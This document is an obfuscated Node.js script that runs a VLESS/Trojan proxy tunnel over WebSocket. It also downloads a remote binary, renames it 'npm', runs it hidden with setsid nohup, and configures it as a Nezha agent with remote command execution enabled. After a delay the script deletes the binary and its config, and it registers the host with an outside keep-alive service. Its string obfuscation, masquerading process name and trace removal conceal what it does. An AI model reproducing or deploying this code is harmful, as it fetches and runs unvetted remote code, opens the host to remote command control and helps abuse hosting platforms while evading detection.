function _0x5177(_0x3a7ca2,_0x213b35){const _0x5c1abb=_0x5c1a();return _0x5177=function(_0x517765,_0x1eb022){_0x517765=_0x517765-0x97;let _0x3c78a2=_0x5c1abb[_0x517765];return _0x3c78a2;},_0x5177(_0x3a7ca2,_0x213b35);}const _0x9a2654=_0x5177;(function(_0x35f071,_0x4593f3){const _0x25c9c6=_0x5177,_0x9973cc=_0x35f071();while(!![]){try{const _0x4f3a6c=parseInt(_0x25c9c6(0xce))/0x1*(-parseInt(_0x25c9c6(0xdb))/0x2)+parseInt(_0x25c9c6(0xcb))/0x3+parseInt(_0x25c9c6(0x115))/0x4+-parseInt(_0x25c9c6(0xe4))/0x5*(parseInt(_0x25c9c6(0x104))/0x6)+parseInt(_0x25c9c6(0xff))/0x7+-parseInt(_0x25c9c6(0xe5))/0x8+parseInt(_0x25c9c6(0xb4))/0x9*(parseInt(_0x25c9c6(0xd0))/0xa);if(_0x4f3a6c===_0x4593f3)break;else _0x9973cc['push'](_0x9973cc['shift']());}catch(_0x3665b3){_0x9973cc['push'](_0x9973cc['shift']());}}}(_0x5c1a,0xca0f4));const os=require('os'),http=require(_0x9a2654(0xd5)),fs=require('fs'),axios=require(_0x9a2654(0xd3)),net=require(_0x9a2654(0x10b)),path=require(_0x9a2654(0xeb)),crypto=require('crypto'),{Buffer}=require(_0x9a2654(0xc1)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x9a2654(0x9b)][_0x9a2654(0xc0)]||_0x9a2654(0xcd),NEZHA_SERVER=process[_0x9a2654(0x9b)][_0x9a2654(0xa2)]||'',NEZHA_PORT=process[_0x9a2654(0x9b)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x9a2654(0x9b)][_0x9a2654(0x10a)]||'',DOMAIN=process[_0x9a2654(0x9b)]['DOMAIN']||_0x9a2654(0xdc),AUTO_ACCESS=process[_0x9a2654(0x9b)][_0x9a2654(0xcc)]||!![],WSPATH=process['env'][_0x9a2654(0xc4)]||UUID[_0x9a2654(0x10f)](0x0,0x8),SUB_PATH=process['env'][_0x9a2654(0xd4)]||_0x9a2654(0xad),NAME=process[_0x9a2654(0x9b)][_0x9a2654(0xa1)]||_0x9a2654(0x117),PORT=process[_0x9a2654(0x9b)][_0x9a2654(0xee)]||0x21d2;let ISP='';const GetISP=async()=>{const _0x554be4=_0x9a2654;try{const _0x4f94b6=await axios[_0x554be4(0xfb)](_0x554be4(0xea)),_0x56e0e7=_0x4f94b6[_0x554be4(0xc9)];ISP=(_0x56e0e7['country_code']+'-'+_0x56e0e7['isp'])[_0x554be4(0xcf)](/ /g,'_');}catch(_0x205147){ISP=_0x554be4(0x113);}};GetISP();const httpServer=http[_0x9a2654(0xca)]((_0x261967,_0x3be412)=>{const _0x4be998=_0x9a2654;if(_0x261967[_0x4be998(0x97)]==='/'){const _0x2a42e4=path['join'](__dirname,_0x4be998(0xd8));fs[_0x4be998(0xda)](_0x2a42e4,_0x4be998(0xb6),(_0x1561e1,_0x49836e)=>{const _0x311f0c=_0x4be998;if(_0x1561e1){_0x3be412[_0x311f0c(0xa6)](0xc8,{'Content-Type':_0x311f0c(0xf9)}),_0x3be412[_0x311f0c(0xa3)](_0x311f0c(0xe2));return;}_0x3be412['writeHead'](0xc8,{'Content-Type':_0x311f0c(0xf9)}),_0x3be412['end'](_0x49836e);});return;}else{if(_0x261967[_0x4be998(0x97)]==='/'+SUB_PATH){const _0x25337f=NAME?NAME+'-'+ISP:ISP,_0x3074a8=_0x4be998(0x10c)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x4be998(0xbd)+DOMAIN+_0x4be998(0xf7)+WSPATH+'#'+_0x25337f,_0x1c15a7=_0x4be998(0xde)+UUID+'@'+DOMAIN+_0x4be998(0xfd)+DOMAIN+_0x4be998(0xbd)+DOMAIN+_0x4be998(0xf7)+WSPATH+'#'+_0x25337f,_0x3ff7af=_0x3074a8+'\x0a'+_0x1c15a7,_0x9ab9b1=Buffer[_0x4be998(0x106)](_0x3ff7af)[_0x4be998(0x9c)](_0x4be998(0xf4));_0x3be412[_0x4be998(0xa6)](0xc8,{'Content-Type':'text/plain'}),_0x3be412[_0x4be998(0xa3)](_0x9ab9b1+'\x0a');}else _0x3be412[_0x4be998(0xa6)](0x194,{'Content-Type':_0x4be998(0xe8)}),_0x3be412[_0x4be998(0xa3)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x9a2654(0x9d))]({'server':httpServer}),uuid=UUID[_0x9a2654(0xcf)](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0x3fe416){return new Promise((_0x4ad530,_0x1c72c0)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x3fe416)){_0x4ad530(_0x3fe416);return;}let _0x27faa9=0x0;function _0x44f8a7(){const _0x3f2e5e=_0x5177;if(_0x27faa9>=DNS_SERVERS[_0x3f2e5e(0xa4)]){_0x1c72c0(new Error(_0x3f2e5e(0xb5)+_0x3fe416+_0x3f2e5e(0xd1)));return;}const _0x1afc57=DNS_SERVERS[_0x27faa9];_0x27faa9++;const _0x54847f=_0x3f2e5e(0xfa)+encodeURIComponent(_0x3fe416)+_0x3f2e5e(0xab);axios[_0x3f2e5e(0xfb)](_0x54847f,{'timeout':0x1388,'headers':{'Accept':_0x3f2e5e(0xf2)}})[_0x3f2e5e(0x10d)](_0x47d4c5=>{const _0x495c40=_0x3f2e5e,_0x5447b8=_0x47d4c5[_0x495c40(0xc9)];if(_0x5447b8[_0x495c40(0xd2)]===0x0&&_0x5447b8[_0x495c40(0x99)]&&_0x5447b8[_0x495c40(0x99)]['length']>0x0){const _0x58409e=_0x5447b8[_0x495c40(0x99)]['find'](_0x2bf695=>_0x2bf695[_0x495c40(0xed)]===0x1);if(_0x58409e){_0x4ad530(_0x58409e[_0x495c40(0xc9)]);return;}}_0x44f8a7();})[_0x3f2e5e(0xba)](_0x65b60b=>{_0x44f8a7();});}_0x44f8a7();});}function handleVlessConnection(_0x51abb6,_0x4fff4b){const _0x3d0139=_0x9a2654,[_0x328bce]=_0x4fff4b,_0x27ea53=_0x4fff4b['slice'](0x1,0x11);if(!_0x27ea53[_0x3d0139(0xaf)]((_0x57724c,_0x25255f)=>_0x57724c==parseInt(uuid[_0x3d0139(0x102)](_0x25255f*0x2,0x2),0x10)))return![];let _0x3bd1e2=_0x4fff4b['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x2208b7=_0x4fff4b[_0x3d0139(0x10f)](_0x3bd1e2,_0x3bd1e2+=0x2)['readUInt16BE'](0x0),_0x331c35=_0x4fff4b[_0x3d0139(0x10f)](_0x3bd1e2,_0x3bd1e2+=0x1)[_0x3d0139(0xc8)](),_0x22ab81=_0x331c35==0x1?_0x4fff4b[_0x3d0139(0x10f)](_0x3bd1e2,_0x3bd1e2+=0x4)[_0x3d0139(0x107)]('.'):_0x331c35==0x2?new TextDecoder()[_0x3d0139(0xb1)](_0x4fff4b[_0x3d0139(0x10f)](_0x3bd1e2+0x1,_0x3bd1e2+=0x1+_0x4fff4b[_0x3d0139(0x10f)](_0x3bd1e2,_0x3bd1e2+0x1)[_0x3d0139(0xc8)]())):_0x331c35==0x3?_0x4fff4b[_0x3d0139(0x10f)](_0x3bd1e2,_0x3bd1e2+=0x10)[_0x3d0139(0xbc)]((_0x35f4a9,_0x42e507,_0x223b46,_0x3f971f)=>_0x223b46%0x2?_0x35f4a9[_0x3d0139(0x105)](_0x3f971f[_0x3d0139(0x10f)](_0x223b46-0x1,_0x223b46+0x1)):_0x35f4a9,[])['map'](_0x37ea4c=>_0x37ea4c[_0x3d0139(0xa8)](0x0)[_0x3d0139(0x9c)](0x10))[_0x3d0139(0x107)](':'):'';_0x51abb6[_0x3d0139(0xd7)](new Uint8Array([_0x328bce,0x0]));const _0x935d4c=createWebSocketStream(_0x51abb6);return resolveHost(_0x22ab81)[_0x3d0139(0x10d)](_0x235550=>{const _0xbc82c4=_0x3d0139;net[_0xbc82c4(0xb2)]({'host':_0x235550,'port':_0x2208b7},function(){const _0x4eb0cb=_0xbc82c4;this[_0x4eb0cb(0xa0)](_0x4fff4b[_0x4eb0cb(0x10f)](_0x3bd1e2)),_0x935d4c['on'](_0x4eb0cb(0xdd),()=>{})[_0x4eb0cb(0x114)](this)['on']('error',()=>{})['pipe'](_0x935d4c);})['on'](_0xbc82c4(0xdd),()=>{});})[_0x3d0139(0xba)](_0x26f078=>{const _0x3396b1=_0x3d0139;net[_0x3396b1(0xb2)]({'host':_0x22ab81,'port':_0x2208b7},function(){const _0x38cf92=_0x3396b1;this[_0x38cf92(0xa0)](_0x4fff4b['slice'](_0x3bd1e2)),_0x935d4c['on'](_0x38cf92(0xdd),()=>{})[_0x38cf92(0x114)](this)['on']('error',()=>{})['pipe'](_0x935d4c);})['on'](_0x3396b1(0xdd),()=>{});}),!![];}function handleTrojanConnection(_0x44a039,_0x1e009e){const _0x570ab3=_0x9a2654;try{if(_0x1e009e[_0x570ab3(0xa4)]<0x3a)return![];const _0x2ef94e=_0x1e009e[_0x570ab3(0x10f)](0x0,0x38)[_0x570ab3(0x9c)](),_0x109ffd=[UUID];let _0x322920=null;for(const _0x34af9f of _0x109ffd){const _0x23fb7f=crypto[_0x570ab3(0x103)]('sha224')[_0x570ab3(0xf8)](_0x34af9f)[_0x570ab3(0xef)]('hex');if(_0x23fb7f===_0x2ef94e){_0x322920=_0x34af9f;break;}}if(!_0x322920)return![];let _0x5d68c9=0x38;_0x1e009e[_0x5d68c9]===0xd&&_0x1e009e[_0x5d68c9+0x1]===0xa&&(_0x5d68c9+=0x2);const _0x2ae43d=_0x1e009e[_0x5d68c9];if(_0x2ae43d!==0x1)return![];_0x5d68c9+=0x1;const _0x292c4f=_0x1e009e[_0x5d68c9];_0x5d68c9+=0x1;let _0x4b9649,_0x12c395;if(_0x292c4f===0x1)_0x4b9649=_0x1e009e[_0x570ab3(0x10f)](_0x5d68c9,_0x5d68c9+0x4)[_0x570ab3(0x107)]('.'),_0x5d68c9+=0x4;else{if(_0x292c4f===0x3){const _0x39fb71=_0x1e009e[_0x5d68c9];_0x5d68c9+=0x1,_0x4b9649=_0x1e009e[_0x570ab3(0x10f)](_0x5d68c9,_0x5d68c9+_0x39fb71)[_0x570ab3(0x9c)](),_0x5d68c9+=_0x39fb71;}else{if(_0x292c4f===0x4)_0x4b9649=_0x1e009e[_0x570ab3(0x10f)](_0x5d68c9,_0x5d68c9+0x10)[_0x570ab3(0xbc)]((_0x59a181,_0x404eb6,_0x36a703,_0x4850c6)=>_0x36a703%0x2?_0x59a181['concat'](_0x4850c6[_0x570ab3(0x10f)](_0x36a703-0x1,_0x36a703+0x1)):_0x59a181,[])[_0x570ab3(0x116)](_0x5e3de0=>_0x5e3de0[_0x570ab3(0xa8)](0x0)[_0x570ab3(0x9c)](0x10))['join'](':'),_0x5d68c9+=0x10;else return![];}}_0x12c395=_0x1e009e[_0x570ab3(0xa8)](_0x5d68c9),_0x5d68c9+=0x2;_0x5d68c9<_0x1e009e[_0x570ab3(0xa4)]&&_0x1e009e[_0x5d68c9]===0xd&&_0x1e009e[_0x5d68c9+0x1]===0xa&&(_0x5d68c9+=0x2);const _0x1284b9=createWebSocketStream(_0x44a039);return resolveHost(_0x4b9649)[_0x570ab3(0x10d)](_0x343de0=>{const _0x4477da=_0x570ab3;net[_0x4477da(0xb2)]({'host':_0x343de0,'port':_0x12c395},function(){const _0x35aaae=_0x4477da;_0x5d68c9<_0x1e009e[_0x35aaae(0xa4)]&&this[_0x35aaae(0xa0)](_0x1e009e[_0x35aaae(0x10f)](_0x5d68c9)),_0x1284b9['on'](_0x35aaae(0xdd),()=>{})[_0x35aaae(0x114)](this)['on'](_0x35aaae(0xdd),()=>{})['pipe'](_0x1284b9);})['on'](_0x4477da(0xdd),()=>{});})['catch'](_0x40a676=>{const _0x1675e4=_0x570ab3;net[_0x1675e4(0xb2)]({'host':_0x4b9649,'port':_0x12c395},function(){const _0x11bdef=_0x1675e4;_0x5d68c9<_0x1e009e[_0x11bdef(0xa4)]&&this[_0x11bdef(0xa0)](_0x1e009e[_0x11bdef(0x10f)](_0x5d68c9)),_0x1284b9['on'](_0x11bdef(0xdd),()=>{})[_0x11bdef(0x114)](this)['on'](_0x11bdef(0xdd),()=>{})['pipe'](_0x1284b9);})['on'](_0x1675e4(0xdd),()=>{});}),!![];}catch(_0x576509){return![];}}wss['on'](_0x9a2654(0xfc),(_0x1c7981,_0x551a51)=>{const _0x3e55f7=_0x9a2654,_0x180afb=_0x551a51[_0x3e55f7(0x97)]||'';_0x1c7981[_0x3e55f7(0xe0)](_0x3e55f7(0xdf),_0x265740=>{const _0x203ca9=_0x3e55f7;if(_0x265740['length']>0x11&&_0x265740[0x0]===0x0){const _0xc5aed=_0x265740[_0x203ca9(0x10f)](0x1,0x11),_0x1a23e2=_0xc5aed[_0x203ca9(0xaf)]((_0x3e90aa,_0x5d73dd)=>_0x3e90aa==parseInt(uuid[_0x203ca9(0x102)](_0x5d73dd*0x2,0x2),0x10));if(_0x1a23e2){!handleVlessConnection(_0x1c7981,_0x265740)&&_0x1c7981[_0x203ca9(0xf0)]();return;}}!handleTrojanConnection(_0x1c7981,_0x265740)&&_0x1c7981[_0x203ca9(0xf0)]();})['on'](_0x3e55f7(0xdd),()=>{});});const getDownloadUrl=()=>{const _0x48338f=_0x9a2654,_0xc2f926=os[_0x48338f(0xc5)]();return _0xc2f926==='arm'||_0xc2f926===_0x48338f(0xe7)||_0xc2f926==='aarch64'?!NEZHA_PORT?_0x48338f(0x101):_0x48338f(0xec):!NEZHA_PORT?_0x48338f(0xf6):_0x48338f(0xf3);},downloadFile=async()=>{const _0x252f32=_0x9a2654;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3bc6e5=getDownloadUrl(),_0x605767=await axios({'method':_0x252f32(0xfb),'url':_0x3bc6e5,'responseType':_0x252f32(0xd9)}),_0x38b837=fs['createWriteStream'](_0x252f32(0xb9));return _0x605767[_0x252f32(0xc9)][_0x252f32(0x114)](_0x38b837),new Promise((_0x623df7,_0x1d852a)=>{_0x38b837['on']('finish',()=>{const _0x96bdf0=_0x5177;console[_0x96bdf0(0x108)](_0x96bdf0(0xe1)),exec(_0x96bdf0(0xc3),_0x370219=>{if(_0x370219)_0x1d852a(_0x370219);_0x623df7();});}),_0x38b837['on']('error',_0x1d852a);});}catch(_0x1316ce){throw _0x1316ce;}},runnz=async()=>{const _0x4c6dd5=_0x9a2654;try{const _0x52eebb=execSync(_0x4c6dd5(0x111),{'encoding':_0x4c6dd5(0xfe)});if(_0x52eebb[_0x4c6dd5(0xa7)]()!==''){console[_0x4c6dd5(0x108)](_0x4c6dd5(0xe3));return;}}catch(_0x4d0b81){}await downloadFile();let _0x1ed483='',_0x1677db=['443','8443',_0x4c6dd5(0x9a),_0x4c6dd5(0xaa),_0x4c6dd5(0xe6),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x178929=_0x1677db[_0x4c6dd5(0x109)](NEZHA_PORT)?_0x4c6dd5(0xb8):'';_0x1ed483=_0x4c6dd5(0xb3)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4c6dd5(0x112)+NEZHA_KEY+'\x20'+_0x178929+_0x4c6dd5(0xe9);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4537b6=NEZHA_SERVER[_0x4c6dd5(0x109)](':')?NEZHA_SERVER[_0x4c6dd5(0xb0)](':')[_0x4c6dd5(0xf5)]():'',_0x4fc335=_0x1677db[_0x4c6dd5(0x109)](_0x4537b6)?_0x4c6dd5(0xa5):_0x4c6dd5(0x110),_0x3a8c53='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x4c6dd5(0xa9)+_0x4fc335+_0x4c6dd5(0xc7)+UUID;fs[_0x4c6dd5(0xd6)](_0x4c6dd5(0x98),_0x3a8c53);}_0x1ed483=_0x4c6dd5(0xb7);}else{console[_0x4c6dd5(0x108)](_0x4c6dd5(0xc2));return;}}try{exec(_0x1ed483,{'shell':_0x4c6dd5(0x100)},_0x41508c=>{const _0x35ec49=_0x4c6dd5;if(_0x41508c)console[_0x35ec49(0xdd)](_0x35ec49(0x10e),_0x41508c);else console[_0x35ec49(0x108)](_0x35ec49(0xbf));});}catch(_0x183bac){console[_0x4c6dd5(0xdd)](_0x4c6dd5(0xbe)+_0x183bac);}};function _0x5c1a(){const _0x30220e=['trim','readUInt16BE','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','2087','&type=A','Automatic\x20Access\x20Task\x20added\x20successfully','sina','unlink','every','split','decode','connect','setsid\x20nohup\x20./npm\x20-s\x20','207KiKjyb','Failed\x20to\x20resolve\x20','utf8','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','--tls','npm','catch','Server\x20is\x20running\x20on\x20port\x20','reduce','&fp=chrome&type=ws&host=','error:\x20','npm\x20is\x20running','UUID','buffer','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','chmod\x20+x\x20npm','WSPATH','arch','https://','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','readUInt8','data','createServer','3725028gQZqvv','AUTO_ACCESS','4f5f28a3-d803-49ae-86c5-dbcb571f8af6','8633gIOptF','replace','119710uHbebf','\x20with\x20all\x20DNS\x20servers','Status','axios','SUB_PATH','http','writeFileSync','send','index.html','stream','readFile','338uArOXd','1234.abc.com','error','trojan://','message','once','npm\x20download\x20successfully','Hello\x20world!','npm\x20is\x20already\x20running,\x20skip\x20running...','5sswRYZ','6406288chaVTr','2083','arm64','text/plain','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://api.ip.sb/geoip','path','https://arm64.ssss.nyc.mn/agent','type','PORT','digest','close','listen','application/dns-json','https://amd64.ssss.nyc.mn/agent','base64','pop','https://amd64.ssss.nyc.mn/v1','&path=%2F','update','text/html','https://dns.google/resolve?name=','get','connection',':443?security=tls&sni=','utf-8','6808767MOqNup','/bin/bash','https://arm64.ssss.nyc.mn/v1','substr','createHash','1182846OhSwDa','concat','from','join','log','includes','NEZHA_KEY','net','vless://','then','npm\x20running\x20error:','slice','false','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','\x20-p\x20','Unknown','pipe','3179400PDOipl','map','sina369','url','config.yaml','Answer','2096','env','toString','Server','post','application/json','write','NAME','NEZHA_SERVER','end','length','true','writeHead'];_0x5c1a=function(){return _0x30220e;};return _0x5c1a();}async function addAccessTask(){const _0xb6fe4d=_0x9a2654;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x3e12f6=_0xb6fe4d(0xc6)+DOMAIN;try{const _0x3765df=await axios[_0xb6fe4d(0x9e)]('https://oooo.serv00.net/add-url',{'url':_0x3e12f6},{'headers':{'Content-Type':_0xb6fe4d(0x9f)}});console['log'](_0xb6fe4d(0xac));}catch(_0x2f0e21){}}const delFiles=()=>{const _0x218640=_0x9a2654;fs['unlink'](_0x218640(0xb9),()=>{}),fs[_0x218640(0xae)](_0x218640(0x98),()=>{});};httpServer[_0x9a2654(0xf1)](PORT,()=>{const _0x172a73=_0x9a2654;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x172a73(0xbb)+PORT);});
